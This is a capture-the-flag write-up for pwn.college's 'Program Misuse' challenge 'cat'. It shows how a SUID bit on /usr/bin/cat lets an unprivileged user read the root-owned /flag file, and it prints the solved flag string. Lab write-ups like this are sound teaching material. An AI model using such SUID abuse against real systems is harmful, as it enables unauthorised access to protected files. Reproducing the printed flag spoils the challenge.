---
layout: page
title: "Challenge Name: cat"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/cat`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/cat
```

output:
```
-rwsr-xr-x 1 root root 43416 Sep  5  2019 /usr/bin/cat
```

-The `s` in `-rws` indicates it's a SUID binary.
-`cat` runs with **root privileges**.

## 🚀 Exploitation

We simply use `cat` to read the flag:

```bash
cat /flag
```
Output:
```
pwn.college{8PCUj5hh6wUteYb_5VXQFFgl-nG.dNDNxwSM0IzMyEzW}
```

